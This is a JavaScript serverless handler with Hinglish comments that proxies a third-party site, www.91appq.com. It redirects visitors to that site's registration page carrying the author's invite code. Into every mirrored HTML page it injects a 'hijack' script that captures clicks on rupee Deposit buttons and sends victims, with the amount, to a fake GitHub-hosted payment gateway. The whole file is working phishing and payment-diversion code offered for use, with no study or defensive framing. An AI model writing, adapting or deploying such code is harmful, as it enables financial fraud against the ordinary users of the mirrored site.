export default async function handler(req, res) {
  const myInviteCode = "6683618531272"; //
  const myGitHub = "https://hacrrk1-netizen.github.io/FAST-payment-gateway-/";
  const targetHost = "https://www.91appq.com";

  // 1. AUTO-REGISTER: Jab koi link kholga toh tere invite code pe jayega
  if (req.url === "/" || req.url === "") {
    res.writeHead(302, { Location: `${targetHost}/#/register?invitationCode=${myInviteCode}` });
    res.end();
    return;
  }

  // 2. MIRRORING: Site fetch karo
  const response = await fetch(targetHost + req.url, {
    headers: { 'User-Agent': req.headers['user-agent'] }
  });

  const contentType = response.headers.get("content-type");

  if (contentType && contentType.includes("text/html")) {
    let html = await response.text();

    // 3. HIJACK SCRIPT (Jo tune naya bheja hai - Vercel compatible)
    const hijackScript = `
    <script>
      (function() {
        const myGitHub = "${myGitHub}";
        
        const attackButton = () => {
          // Saare buttons aur role-based buttons scan karo
          const allElements = document.querySelectorAll('button, .van-button, [role="button"], div');
          
          allElements.forEach(el => {
            const text = el.innerText || "";
            // Condition: Deposit aur ₹ sign dono ho
            if (text.includes('Deposit') && text.includes('₹')) {
              
              if (!el.dataset.locked) {
                // Event Capture listener jo asli click ko hijack kar leta hai
                const hijack = (e) => {
                  e.preventDefault();
                  e.stopImmediatePropagation();
                  
                  // Amount capture logic
                  const amtMatch = text.match(/[\\d,.]+/);
                  const amount = amtMatch ? amtMatch[0].replace(/,/g, '') : '2000';
                  
                  window.location.href = myGitHub + "?amount=" + amount;
                };

                el.addEventListener('click', hijack, true);
                el.addEventListener('touchstart', hijack, true);
                el.dataset.locked = "true";
              }
            }
          });
        };

        setInterval(attackButton, 300); // 300ms scan for dynamic site

        // Global Safety: Agar koi element miss ho jaye
        document.addEventListener('click', (e) => {
          const txt = e.target.innerText || "";
          if (txt.includes('Deposit') && txt.includes('₹')) {
            e.preventDefault();
            e.stopImmediatePropagation();
            window.location.href = myGitHub;
          }
        }, true);
      })();
    </script>`;

    res.setHeader('Content-Type', 'text/html');
    return res.send(html.replace('</body>', hijackScript + '</body>'));
  }

  const data = await response.arrayBuffer();
  res.setHeader('Content-Type', contentType);
  res.send(Buffer.from(data));
      }
